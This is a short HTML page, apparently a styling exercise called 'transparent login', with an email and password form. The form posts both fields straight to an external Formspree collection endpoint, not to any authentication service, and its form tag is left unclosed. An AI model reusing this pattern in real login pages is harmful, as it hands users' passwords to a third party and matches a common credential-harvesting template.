<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="transparent-login">
    <link rel="stylesheet" href="style.css">
    <script src="https://kit.fontawesome.com/3eec0028da.js" crossorigin="anonymous"></script>
    <style>@import url('http://fonts.cdnfonts.com/css/samarkan');
    @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');</style>
    <title>transparent login</title>
</head>
<body>
    <form
  action="https://formspree.io/f/mpzbabkw"
  method="POST"
>
    <main><h1>Login</h1><br><br><br>
    <fieldset>
    <div>
        <label for="email"></label>
        <i class="fas fa-at"></i>
            <input type="email" name="email" id="email" placeholder="Your email..."/>
        </div><br><br>
    <div>
        <label for="password"></label>
        <i class="fas fa-lock"></i>
            <input type="password" name="password" id="password" placeholder="Your password..."></div>
    </fieldset>
    <button type="submit">Sign in</button>
    </main>
</body>
</html>
